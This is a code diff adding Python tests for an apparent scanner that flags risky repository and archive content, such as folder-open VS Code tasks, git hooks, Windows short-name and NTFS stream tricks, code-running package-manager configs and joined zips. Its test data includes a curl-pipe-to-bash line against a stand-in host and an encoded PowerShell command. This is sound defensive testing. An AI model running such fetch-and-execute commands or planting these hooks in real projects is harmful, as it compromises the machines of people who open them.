@@ -60,6 +60,25 @@ def test_windows_name_tricks_still_count_as_git():
     assert has(f, HIGH, "b/GIT~1/", ".git directory")
 
 
+def test_windows_short_names_are_high():
+    f = scan({".vscode/": "", "VSCODE~1/tasks.json": '{"runOptions":{"runOn":"folderOpen"}}',
+              "CLAUDE~1/settings.json": '{"hooks": {}}', "PROGRA~2/x.txt": "x",
+              "release~notes.txt": "x", "my~file.md": "x", "backup~.txt": "x"})  # tildes in normal names
+    for p in ("VSCODE~1/tasks.json", "CLAUDE~1/settings.json", "PROGRA~2/x.txt"):
+        assert has(f, HIGH, p, "8.3 short name"), p
+    assert not any("short name" in x.reason for x in f if "~1" not in x.path and "~2" not in x.path)
+
+
+def test_ntfs_stream_syntax_is_resolved_and_flagged():
+    task = '{"runOptions":{"runOn":"folderOpen"}}'
+    f = scan({".vscode::$INDEX_ALLOCATION/tasks.json": task, "b/.vscode:$I30:$INDEX_ALLOCATION/tasks.json": task,
+              "c/.git::$INDEX_ALLOCATION/hooks/post-checkout": "echo test"})
+    assert has(f, HIGH, ".vscode::$INDEX_ALLOCATION/tasks.json", "folderOpen")
+    assert has(f, HIGH, "b/.vscode:$I30:$INDEX_ALLOCATION/tasks.json", "folderOpen")
+    assert has(f, HIGH, "c/.git::$INDEX_ALLOCATION/hooks/post-checkout", "hook")
+    assert has(f, HIGH, ".vscode::$INDEX_ALLOCATION/tasks.json", "colon in the name")
+
+
 def test_bare_repo_and_gitdir_pointer():
     f = scan({"proj/.git": "gitdir: ../hidden", "hidden/HEAD": "ref", "hidden/config": "[core]\n",
               "hidden/objects/x": "", "hidden/hooks/post-checkout": "echo x"})
@@ -226,6 +245,18 @@ def test_crashing_rule_is_reported_and_other_rules_still_run(monkeypatch):
     assert has(f, HIGH, "contract.pdf.exe", "double extension")
 
 
+def test_package_manager_configs_that_run_code():
+    f = scan({".yarnrc.yml": "nodeLinker: node-modules\nyarnPath: .yarn/releases/x.cjs\n",
+              "a/.yarnrc": 'yarn-path ".yarn/x.js"\n', "b/.npmrc": "script-shell=./x.exe\n",
+              ".pnpmfile.cjs": "module.exports = {}",
+              "c/.npmrc": "registry=https://registry.npmjs.org/\n", "d/.yarnrc.yml": "nodeLinker: node-modules\n"})
+    assert has(f, MEDIUM, ".yarnrc.yml", "yarnPath")
+    assert has(f, MEDIUM, "a/.yarnrc", "yarn-path")
+    assert has(f, MEDIUM, "b/.npmrc", "script-shell")
+    assert has(f, MEDIUM, ".pnpmfile.cjs", "pnpm")
+    assert not any(x.path in ("c/.npmrc", "d/.yarnrc.yml") for x in f)
+
+
 def test_suspicious_text_patterns():
     f = scan({"a.sh": "curl -s https://example.invalid/x | bash",
               "b.txt": "powershell -enc " + "A" * 40,
@@ -304,6 +335,14 @@ def test_disguised_nested_zips_are_scanned():
     assert has(f, HIGH, "inner.zip!/.git/hooks/post-checkout", "hook")
     assert has(f, HIGH, "photo.png!/.git/hooks/post-checkout", "hook")
     assert has(f, HIGH, "fake.zip", "corrupted")
+
+
+def test_joined_zips_never_skip_silently(monkeypatch):
+    layers = b"".join(make_zip({f"layer{i}/.git/hooks/post-checkout": "echo test"}) for i in range(5))
+    assert any("not scanned" in x.reason for x in scan(layers))  # front layer beyond the depth limit
+    monkeypatch.setattr(triage, "MAX_FILE_BYTES", 1000)
+    big_front = make_zip({"pad.bin": "x" * 5000, ".git/hooks/post-checkout": "echo"}, zipfile.ZIP_STORED)
+    assert has(scan(big_front + make_zip({"README.md": "hi"})), HIGH, "test.zip", "in front of the archive")
 
 
 def zip_with_unicode_path_field(plain, unicode_name, content):
